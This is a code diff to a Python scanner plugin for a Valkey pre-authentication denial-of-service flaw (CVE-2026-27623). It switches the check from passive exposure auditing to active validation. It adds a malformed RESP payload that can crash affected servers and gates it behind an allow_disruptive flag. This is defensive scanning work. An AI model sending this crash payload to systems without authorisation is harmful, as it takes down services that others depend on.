@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Safe exposure audit for Valkey malformed RESP pre-auth DoS risk."""
+"""Safe active validation for Valkey malformed RESP pre-auth DoS risk."""
 from __future__ import annotations
 
 from active_validation_core import run_active_validation
@@ -16,7 +16,7 @@ VULN = {
     "type": "预认证DoS",
     "summary": "Valkey 9.0.0-9.0.2 在处理畸形 RESP pipeline 请求时存在状态机缺陷，可导致预认证服务崩溃；车联网后端缓存、边缘网关与研发台架需排查。",
     "source_description": "poc-lab documents a pre-authentication denial of service caused by malformed RESP input such as an empty multibulk followed by inline command data.",
-    "poc_status": "poc-lab公开复现；本插件仅做安全暴露审计",
+    "poc_status": "poc-lab公开复现；本插件支持主动验证；破坏性 payload 需 allow_disruptive 授权",
     "research_value": "Valkey/Redis 兼容组件常见于车联网数据链路与边缘缓存，预认证 DoS 会影响服务可用性。",
     "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-27623%20Pre-Authentication%20DOS%20from%20malformed%20RESP%20request",
     "references": [
@@ -37,6 +37,9 @@ VULN = {
         "CVE-2026-27623", "Valkey", "RESP", "networking.c", "processInputBuffer",
         "parseMultibulk", "pre-auth", "9.0.0", "9.0.1", "9.0.2", "9.0.3",
     ],
+    # Malformed empty multibulk followed by inline command data. The framework
+    # sends this only when allow_disruptive=true and records pre/post liveness.
+    "active_payload_text": "*0\r\nPING\r\n",
 }
 
 
